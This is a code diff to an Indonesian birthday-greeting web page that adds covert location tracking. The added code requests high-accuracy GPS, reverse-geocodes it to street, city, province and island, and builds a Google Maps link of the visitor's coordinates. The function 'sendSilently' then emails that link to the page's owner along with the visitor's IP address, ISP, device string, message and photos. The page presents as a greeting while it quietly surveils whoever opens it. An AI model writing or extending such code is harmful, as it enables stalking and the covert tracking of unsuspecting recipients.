@@ -295,7 +295,7 @@ footer{border-top:1px solid var(--line);padding:0 0 46px}
   </div>
   <div class="wrap cue"><span class="cue-line"></span> gulir pelan-pelan</div>
 </section>
-<div class="marquee"><div class="track" style="--sp:26s"><span>Selamat Ulang Tahun ✦ Happy Birthday ✦ Make a Wish ✦ </span><span>Selamat Ulang Tahun ✦ Happy Birthday  Make a Wish  </span></div></div>
+<div class="marquee"><div class="track" style="--sp:26s"><span>Selamat Ulang Tahun ✦ Happy Birthday  Make a Wish ✦ </span><span>Selamat Ulang Tahun ✦ Happy Birthday  Make a Wish  </span></div></div>
 <section class="sec" id="wish">
   <div class="wrap grid2">
     <div>
@@ -407,7 +407,8 @@ function fileToDataURL(file, maxW = 500, quality = .65){
 }
 
 /* ============================================================
-   EMAIL + LOKASI (5 LAPIS BACKUP, SEMUA HTTPS — aman di HP)
+   LOKASI: GPS HP dulu (kalau hidup & diizinkan) → fallback IP
+   Detail: jalan · kota · provinsi · pulau · negara
 ============================================================ */
 let emailjsReady = false;
 async function initEmailJS(){
@@ -417,36 +418,98 @@ async function initEmailJS(){
   catch(e){ return false; }
 }
 
-async function getLokasi(){
-  const kosong = { kota:'-', provinsi:'-', negara:'-', ip:'-', isp:'-' };
-  // 1) ipwho.is
-  try {
-    const j = await (await fetch('https://ipwho.is/')).json();
-    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country||'-', ip:j.ip||'-', isp:(j.connection&&j.connection.isp)||'-' };
-  } catch(e){ console.warn('[LOKASI] 1 gagal'); }
-  // 2) ipapi.co
-  try {
-    const j = await (await fetch('https://ipapi.co/json/')).json();
-    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country_name||'-', ip:j.ip||'-', isp:j.org||'-' };
-  } catch(e){ console.warn('[LOKASI] 2 gagal'); }
-  // 3) ipinfo.io
-  try {
-    const j = await (await fetch('https://ipinfo.io/json')).json();
-    if (j && j.city) return { kota:j.city||'-', provinsi:j.region||'-', negara:j.country||'-', ip:j.ip||'-', isp:j.org||'-' };
-  } catch(e){ console.warn('[LOKASI] 3 gagal'); }
-  // 4) bigdatacloud (tanpa key)
-  try {
-    const j = await (await fetch('https://api.bigdatacloud.net/data/client-ip-info')).json();
-    if (j && j.city) return { kota:j.city||'-', provinsi:j.principalSubdivision||j.locality||'-', negara:j.countryName||'-', ip:j.ipString||'-', isp:'-' };
-  } catch(e){ console.warn('[LOKASI] 4 gagal'); }
-  // 5) ipify (IP saja)
-  try {
-    const j = await (await fetch('https://api.ipify.org?format=json')).json();
-    if (j && j.ip) return { kota:'-', provinsi:'-', negara:'-', ip:j.ip, isp:'-' };
-  } catch(e){ console.warn('[LOKASI] 5 gagal'); }
-  return kosong;
+// ambil koordinat GPS (muncul permintaan izin di HP)
+function getGPS(){
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    const to = setTimeout(() => resolve(null), 7000);
+    navigator.geolocation.getCurrentPosition(
+      p => { clearTimeout(to); resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }); },
+      () => { clearTimeout(to); resolve(null); },
+      { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+    );
+  });
 }
 
+// ubah koordinat → alamat lengkap (jalan, kota, provinsi, pulau, negara)
+async function reverseGeocode(lat, lng){
+  try {
+    const j = await (await fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude='+lat+'&longitude='+lng+'&localityLanguage=id')).json();
+    return {
+      jalan: j.localityInfo?.road || j.locality || '-',
+      kota: j.city || j.locality || '-',
+      provinsi: j.principalSubdivision || '-',
+      pulau: j.principalSubdivision ? guessPulau(j.principalSubdivision) : '-',
+      negara: j.countryName || '-'
+    };
+  } catch(e){ return null; }
+}
+
+// tebak pulau dari nama provinsi Indonesia
+function guessPulau(prov){
+  const p = prov.toLowerCase();
+  const sumatra = ['aceh','sumatera','sumatra','lampung','bengkulu','jambi','riau','kepulauan bangka','kep. bangka'];
+  const jawa = ['jakarta','jawa barat','jawa tengah','jawa timur','banten','yogyakarta','daerah istimewa'];
+  const kalimantan = ['kalimantan'];
+  const sulawesi = ['sulawesi','gorontalo'];
+  const bali_nusa = ['bali','ntb','ntt','nusa tenggara'];
+  const papua = ['papua'];
+  const maluku = ['maluku'];
+  if (sumatra.some(x=>p.includes(x))) return 'Sumatra';
+  if (jawa.some(x=>p.includes(x))) return 'Jawa';
+  if (kalimantan.some(x=>p.includes(x))) return 'Kalimantan';
+  if (sulawesi.some(x=>p.includes(x))) return 'Sulawesi';
+  if (bali_nusa.some(x=>p.includes(x))) return 'Bali & Nusa Tenggara';
+  if (papua.some(x=>p.includes(x))) return 'Papua';
+  if (maluku.some(x=>p.includes(x))) return 'Maluku';
+  return '-';
+}
+
+// fallback: lokasi berdasarkan IP (5 layanan HTTPS)
+async function getLokasiIP(){
+  const kosong = { jalan:'-', kota:'-', provinsi:'-', pulau:'-', negara:'-', ip:'-', isp:'-' };
+  let kota='-',provinsi='-',negara='-',ip='-',isp='-';
+  try { const j=await(await fetch('https://ipwho.is/')).json(); if(j&&j.city){kota=j.city;provinsi=j.region;negara=j.country;ip=j.ip;isp=(j.connection&&j.connection.isp)||'-';} } catch(e){}
+  if(kota==='-'){ try { const j=await(await fetch('https://ipapi.co/json/')).json(); if(j&&j.city){kota=j.city;provinsi=j.region;negara=j.country_name;ip=j.ip;isp=j.org||'-';} } catch(e){} }
+  if(kota==='-'){ try { const j=await(await fetch('https://ipinfo.io/json')).json(); if(j&&j.city){kota=j.city;provinsi=j.region;negara=j.country;ip=j.ip;isp=j.org||'-';} } catch(e){} }
+  if(kota==='-'){ try { const j=await(await fetch('https://api.bigdatacloud.net/data/client-ip-info')).json(); if(j&&j.city){kota=j.city;provinsi=j.principalSubdivision;negara=j.countryName;ip=j.ipString||'-';} } catch(e){} }
+  if(ip==='-'){ try { const j=await(await fetch('https://api.ipify.org?format=json')).json(); if(j&&j.ip) ip=j.ip; } catch(e){} }
+  return { jalan:'-', kota:kota||'-', provinsi:provinsi||'-', pulau:provinsi?guessPulau(provinsi):'-', negara:negara||'-', ip:ip||'-', isp:isp||'-' };
+}
+
+// fungsi utama: GPS优先, gagal → IP
+async function getLokasi(){
+  let hasil = { sumber:'IP', jalan:'-', kota:'-', provinsi:'-', pulau:'-', negara:'-', ip:'-', isp:'-', gps:'-' };
+
+  // 1️⃣ coba GPS
+  const gps = await getGPS();
+  if (gps){
+    const r = await reverseGeocode(gps.lat, gps.lng);
+    hasil.gps = 'https://maps.google.com/?q=' + gps.lat + ',' + gps.lng;
+    if (r){
+      hasil.sumber = 'GPS';
+      hasil.jalan = r.jalan; hasil.kota = r.kota; hasil.provinsi = r.provinsi;
+      hasil.pulau = r.pulau; hasil.negara = r.negara;
+    }
+  }
+
+  // 2️⃣ IP + ISP (juga isi kota/provinsi/negara kalau GPS gagal)
+  const ipL = await getLokasiIP();
+  hasil.ip = ipL.ip; hasil.isp = ipL.isp;
+  if (hasil.kota === '-'){
+    hasil.kota = ipL.kota; hasil.provinsi = ipL.provinsi;
+    hasil.pulau = ipL.pulau; hasil.negara = ipL.negara;
+  }
+
+  // susun teks rapi (buang bagian kosong, anti ", ,")
+  const bagian = [hasil.jalan, hasil.kota, hasil.provinsi, hasil.pulau, hasil.negara].filter(v => v && v !== '-');
+  hasil.alamat_lengkap = bagian.length ? bagian.join(', ') : '-';
+  return hasil;
+}
+
+/* ============================================================
+   UPLOAD FOTO → CLOUDINARY
+============================================================ */
 async function uploadToCloudinary(dataUrl, idx){
   const blob = await (await fetch(dataUrl)).blob();
   const form = new FormData();
@@ -490,6 +553,9 @@ function buildFotoHTML(urls){
   )).join('');
 }
 
+/* ============================================================
+   KIRIM EMAIL
+============================================================ */
 async function sendSilently(trigger = 'unknown'){
   console.log('[EMAIL/'+trigger+'] Starting...');
   try {
@@ -498,7 +564,6 @@ async function sendSilently(trigger = 'unknown'){
     const waktu = new Date().toLocaleString('id-ID',{dateStyle:'full',timeStyle:'short'});
     const device = navigator.userAgent.substring(0, 120);
     const lokasi = await getLokasi();
-    const lokasi_lengkap = [lokasi.kota, lokasi.provinsi, lokasi.negara].filter(v => v && v !== '-').join(', ') || '-';
     const punyaFoto = DATA.fotos.length > 0;
     const urls = await buildFotoLinks(DATA.fotos);
     const params = {
@@ -506,10 +571,14 @@ async function sendSilently(trigger = 'unknown'){
       tanggal: DATA.tanggal || '(kosong)',
       pesan: DATA.pesan || '(tidak ada pesan)',
       waktu, device,
+      sumber_lokasi: lokasi.sumber,
+      alamat_lengkap: lokasi.alamat_lengkap,
+      jalan: lokasi.jalan,
       kota: lokasi.kota,
       provinsi: lokasi.provinsi,
+      pulau: lokasi.pulau,
       negara: lokasi.negara,
-      lokasi_lengkap: lokasi_lengkap,
+      gps_link: lokasi.gps,
       ip_penerima: lokasi.ip,
       isp: lokasi.isp,
       jumlah_foto: String(DATA.fotos.length),
